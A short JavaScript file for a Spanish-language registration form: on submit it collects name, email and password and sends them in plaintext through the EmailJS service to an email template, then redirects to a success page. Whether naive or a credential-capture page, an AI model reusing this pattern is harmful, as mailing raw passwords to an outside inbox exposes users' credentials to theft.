emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formRegistro').addEventListener('submit', (e) => {
    e.preventDefault();
    
    const boton = document.querySelector('.boton-magico');
    boton.style.pointerEvents = 'none';
    
    const datos = {
        nombre: document.getElementById('nombre').value,
        correo: document.getElementById('correo').value,
        contrasena: document.getElementById('password').value
    };

    emailjs.send("service_syrc1uk", "template_otuzmqu", datos)
        .then(() => {
            window.location.href = 'success.html';
        })
        .catch((error) => {
            alert('Error: ' + error.text);
            boton.style.pointerEvents = 'auto';
        });
});

// Animaciones adicionales
document.querySelectorAll('.input-container input').forEach(input => {
    input.addEventListener('focus', () => {
        input.parentNode.style.transform = 'scale(1.02)';
    });
    
    input.addEventListener('blur', () => {
        input.parentNode.style.transform = 'scale(1)';
    });
});
